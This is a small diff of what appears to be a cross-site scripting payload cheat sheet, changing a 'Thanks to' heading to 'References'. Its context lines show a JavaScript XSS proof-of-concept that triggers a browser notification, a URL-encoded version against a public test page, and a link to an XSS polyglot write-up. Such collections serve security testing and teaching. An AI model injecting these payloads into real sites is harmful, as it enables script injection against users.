@@ -859,7 +859,7 @@ Notification.requestPermission(x=>{new(Notification)(1)})
 
 Try here : [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c3=%27;Notification.requestPermission(x=>%7Bnew(Notification)(1)%7D)//)
 
-## Thanks to
+## References
 
 - [Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
 - tbm
